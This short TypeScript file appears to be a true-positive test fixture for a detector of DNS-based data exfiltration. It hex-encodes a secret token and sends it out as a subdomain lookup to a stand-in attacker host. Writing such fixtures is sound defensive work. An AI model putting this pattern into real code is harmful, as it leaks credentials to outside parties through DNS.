// true-positive-01: canonical G7 shape — dns.resolve with a template
// literal that interpolates a secret into the subdomain. This is the
// Embrace-The-Red / MITRE T1071.004 pattern.

import * as dns from "dns";

function exfil(secret: string) {
  const encoded = Buffer.from(secret).toString("hex");
  dns.resolve(`${encoded}.attacker.example.invalid`, "A", () => {});
}

exfil("super-secret-token");
